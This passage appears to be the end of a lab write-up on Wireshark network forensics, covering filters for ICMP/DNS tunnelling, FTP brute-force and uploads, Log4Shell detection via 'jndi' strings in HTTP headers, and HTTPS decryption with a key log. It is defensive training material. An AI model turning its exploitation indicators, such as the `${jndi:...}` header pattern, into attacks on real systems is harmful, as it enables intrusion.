- `data.len > 64` for ICMP and `dns.qry.name.len > 15` for DNS are your starting filters

**FTP**
- Everything is plaintext — credentials, filenames, commands
- `530` = failed login (brute force), `230` = success, `213` = file size, `RETR` = download, `STOR` = upload
- CHMOD after file upload = likely persistence or privilege escalation setup

**HTTP**
- User-Agent is your first anomaly indicator but never your only one
- Log4Shell lives in HTTP headers — `frame contains "jndi"` finds it instantly
- POST to unusual paths + `${jndi:...}` User-Agent = confirmed exploitation attempt

**HTTPS Decryption**
- No key log file = no decryption (this is by design)
- Key log must be captured **during** the session
- After loading the key, `http2` and `:authority` fields unlock the full picture

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| Wireshark | Primary analysis tool — all filtering, statistics, stream following |
| CyberChef | Base64 decoding, IP defanging, payload analysis |
| Exercise.pcapng | Main lab capture file |
| icmp-tunnel.pcap | ICMP tunnelling lab |
| dns.pcap | DNS tunnelling lab |
| ftp.pcap | FTP analysis lab |
| Bonus-exercise.pcap | Cleartext credentials and firewall rules bonus tasks |
| KeysLogFile.txt | TLS session keys for HTTPS decryption |

---
